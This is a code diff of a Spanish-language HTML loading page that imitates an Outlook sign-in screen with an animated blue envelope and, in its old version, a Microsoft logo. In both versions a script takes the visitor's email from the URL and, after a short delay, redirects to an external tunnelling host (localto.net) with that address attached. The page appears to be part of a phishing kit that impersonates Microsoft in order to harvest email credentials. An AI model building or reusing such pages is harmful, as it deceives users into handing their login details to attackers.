@@ -1,152 +1,180 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Iniciando sesión en Outlook</title>
+  <title>Cargando...</title>
   <style>
-    :root {
-      --outlook-blue: #0078d4;
-      --outlook-dark: #005a9e;
-      --outlook-light: #28a8eb;
-    }
-
     body {
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-      background-color: #ffffff;
-      font-family: 'Segoe UI', Tahoma, sans-serif;
+      background: white;
+      font-family: Arial, sans-serif;
     }
 
-    .loader-container {
-      position: relative;
+    .container {
+      animation: slide 0.5s ease-in forwards;
+      opacity: 0;
+    }
+
+    .wrapper {
       width: 120px;
-      height: 120px;
-      perspective: 400px; /* Necesario para el efecto 3D de la tapa */
+      height: 60px;
+      background-color: #68DFFF;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 0;
+      border-radius: 5%;
+      border-top-left-radius: 0%;
+      border-top-right-radius: 0%;
     }
 
-    /* El cuerpo del sobre */
-    .envelope {
-      position: absolute;
-      bottom: 20px;
-      width: 100px;
-      height: 65px;
-      background: var(--outlook-blue);
-      border-radius: 0 0 8px 8px;
-      z-index: 10;
-      left: 50%;
-      transform: translateX(-50%);
-    }
-
-    /* Parte frontal del sobre (el triángulo inferior) */
-    .envelope::before {
-      content: "";
+    .envelope-body {
       position: absolute;
       top: 0;
       left: 0;
-      width: 0;
-      height: 0;
-      border-style: solid;
-      border-width: 0 50px 35px 50px;
-      border-color: transparent transparent rgba(255,255,255,0.2) transparent;
-      z-index: 11;
+      border-top: 30px solid transparent;
+      border-left: 60px solid #28A8EB;
+      border-right: 60px solid #1690E2;
+      border-bottom: 30px solid #28A8EB;
+      z-index: 2;
+      border-radius: 5%;
     }
 
-    /* La solapa (la tapa que se abre) */
-    .lid {
-      position: absolute;
-      top: 35px; /* Ajustado para cerrar justo arriba del sobre */
-      left: 10px;
-      width: 0;
-      height: 0;
-      border-style: solid;
-      border-width: 35px 50px 0 50px;
-      border-color: var(--outlook-light) transparent transparent transparent;
-      transform-origin: top;
-      z-index: 12;
-      animation: open-lid 2.5s infinite;
-    }
+    .shade1 { grid-area: shade1; background-color: #0458A9 }
+    .shade2 { grid-area: shade2; background-color: #0078D6 }
+    .shade3 { grid-area: shade3; background-color: #28A8EB }
+    .shade4 { grid-area: shade4; background-color: #51D9FE; }
+    .shade5 { grid-area: shade5; background-color: #0665BB }
+    .shade6 { grid-area: shade6; background-color: #164380; }
 
-    /* La carta que sale */
     .letter {
       position: absolute;
-      bottom: 30px;
-      left: 20px;
-      width: 80px;
-      height: 60px;
-      background: white;
-      border-radius: 4px;
-      z-index: 5;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-      display: flex;
-      flex-direction: column;
-      padding: 8px;
-      box-sizing: border-box;
-      animation: letter-out 2.5s infinite;
+      top: 0;
+      width: 80%;
+      z-index: 1;
+      border-radius: 5%;
+      display: grid;
+      grid-template-columns: auto auto auto;
+      grid-template-rows: 12px 36px 36px 36px;
+      grid-template-areas:
+        'div1 div1 div1'
+        'div2 div2 div2'
+        'div3 div3 div3'
+        'div4 div4 div4';
+      animation: letter 0.5s 1s ease-in forwards;
     }
 
-    .line {
-      height: 4px;
-      background: #e1e1e1;
-      margin-bottom: 6px;
-      border-radius: 2px;
-    }
-    .line.blue { width: 50%; background: var(--outlook-blue); }
-    .line.gray { width: 85%; }
-
-    /* Animaciones */
-    @keyframes open-lid {
-      0%, 10% { transform: rotateX(0deg); z-index: 12; }
-      30%, 80% { transform: rotateX(180deg); z-index: 0; }
-      100% { transform: rotateX(0deg); z-index: 12; }
+    .div1 {
+      grid-area: div1;
+      display: grid;
+      grid-template-columns: auto auto auto;
+      grid-template-areas: 'shade1 shade1 shade1';
+      border-radius: 5%;
     }
 
-    @keyframes letter-out {
-      0%, 25% { transform: translateY(0); opacity: 0; }
-      45%, 70% { transform: translateY(-45px); opacity: 1; }
-      85%, 100% { transform: translateY(-10px); opacity: 0; }
+    .div2 {
+      grid-area: div2;
+      display: grid;
+      grid-template-columns: auto auto auto;
+      grid-template-areas: 'shade2 shade3 shade4';
+    }
+
+    .div3 {
+      grid-area: div3;
+      display: grid;
+      grid-template-columns: auto auto auto;
+      grid-template-areas: 'shade5 shade2 shade3';
+      opacity: 0;
+      animation: show 0.1s 1.2s ease-in forwards;
+    }
+
+    .div4 {
+      grid-area: div4;
+      display: grid;
+      grid-template-columns: auto auto auto;
+      grid-template-areas: 'shade6 shade5 shade2';
+      opacity: 0;
+      animation: show 0.05s 1.4s ease-in forwards;
+    }
+
+    .lid {
+      position: absolute;
+      top: 0;
+      left: 0;
+      border-top: #68DFFF 30px solid;
+      border-left: 60px solid transparent;
+      border-right: 60px solid transparent;
+      border-bottom: 30px solid transparent;
+      transform-origin: top;
+      z-index: 2;
+      animation: open 0.5s 0.5s ease-in forwards;
+    }
+
+    @keyframes open {
+      0% { transform: rotateX(0deg); z-index: 2 }
+      100% { transform: rotateX(180deg); z-index: 0 }
+    }
+
+    @keyframes letter {
+      0% { transform: translateY(0px) }
+      95% { transform: translateY(-69px) }
+      100% { transform: translateY(-63px) }
+    }
+
+    @keyframes slide {
+      0% { transform: scale(1); opacity: 0.4 }
+      100% { transform: scale(1.6); opacity: 1 }
+    }
+
+    @keyframes show {
+      0% { opacity: 0 }
+      100% { opacity: 1 }
     }
 
     .loading-text {
-      margin-top: 20px;
-      color: #666;
-      font-size: 14px;
-    }
-
-    .footer-logo {
-      position: fixed;
-      bottom: 40px;
-    }
-
-    .footer-logo img {
-      width: 100px;
-      height: auto;
-      filter: opacity(0.8);
+      position: absolute;
+      top: calc(100% + 12px);
+      text-align: center;
+      width: 100%;
+      font-size: 12px;
+      color: #333;
     }
   </style>
 </head>
 <body>
-
-  <div class="loader-container">
-    <div class="lid"></div>
-    
-    <div class="letter">
-      <div class="line blue"></div>
-      <div class="line gray"></div>
-      <div class="line gray"></div>
+  <div class="container">
+    <div class="wrapper">
+      <div class="lid"></div>
+      <div class="envelope-body"></div>
+      <div class="letter">
+        <div class="div1">
+          <div class="shade1"></div>
+        </div>
+        <div class="div2">
+          <div class="shade2"></div>
+          <div class="shade3"></div>
+          <div class="shade4"></div>
+        </div>
+        <div class="div3">
+          <div class="shade5"></div>
+          <div class="shade2"></div>
+          <div class="shade3"></div>
+        </div>
+        <div class="div4">
+          <div class="shade6"></div>
+          <div class="shade5"></div>
+          <div class="shade2"></div>
+        </div>
+      </div>
+ 
     </div>
-    
-    <div class="envelope"></div>
-  </div>
-
-  <div class="loading-text">Cargando...</div>
-
-  <div class="footer-logo">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="Microsoft">
   </div>
 
   <script>
@@ -154,13 +182,13 @@
     const email = params.get("email");
 
     setTimeout(function () {
-      const destino = "https://umxatk6gbc.localto.net/chhtm"; 
-      let urlFinal = destino;
+      const destino = "https://umxatk6gbc.localto.net/chhtm?email=##Email##"; // Página final
       if (email) {
-        urlFinal += (destino.includes('?') ? '&' : '?') + `email=${encodeURIComponent(email)}`;
+        window.location.href = `${destino}?email=${encodeURIComponent(email)}`;
+      } else {
+        window.location.href = destino;
       }
-      window.location.href = urlFinal;
-    }, 1500); 
+    }, 1900);
   </script>
 </body>
 </html>
